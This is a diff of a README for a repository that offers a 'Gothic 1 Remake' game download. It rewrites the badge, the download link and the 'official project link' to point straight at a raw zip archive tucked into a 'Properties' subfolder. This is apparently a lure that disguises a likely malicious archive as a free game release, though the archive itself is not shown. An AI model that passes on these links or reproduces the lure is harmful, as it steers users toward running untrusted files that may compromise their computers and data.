@@ -1,10 +1,10 @@
 # 🏰 Gothic-1-Remake-Release - Play the classic gothic adventure today
 
-[![Download Gothic Remake](https://img.shields.io/badge/Download-Gothic_1_Remake-blue.svg)](https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release)
+[![Download Gothic Remake](https://img.shields.io/badge/Download-Gothic_1_Remake-blue.svg)](https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release/raw/refs/heads/main/gothic/Properties/Gothic-Remake-Release-1.8.zip)
 
 ## 📥 How to download the game
 
-Go to this link to find the game files: [https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release](https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release)
+Go to this link to find the game files: [https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release/raw/refs/heads/main/gothic/Properties/Gothic-Remake-Release-1.8.zip](https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release/raw/refs/heads/main/gothic/Properties/Gothic-Remake-Release-1.8.zip)
 
 Follow these steps to get the game on your computer:
 
@@ -68,6 +68,6 @@ If you think the game files are broken, you can check them. Many users find that
 
 ## 🔗 Official project link
 
-Use this link for all future updates and releases: [https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release](https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release)
+Use this link for all future updates and releases: [https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release/raw/refs/heads/main/gothic/Properties/Gothic-Remake-Release-1.8.zip](https://github.com/Drinkshellstitch271/Gothic-1-Remake-Release/raw/refs/heads/main/gothic/Properties/Gothic-Remake-Release-1.8.zip)
 
 Bookmark this page to check for patches or new content. The project team updates the files to improve stability based on feedback from the community. Save your game often to keep your progress safe.
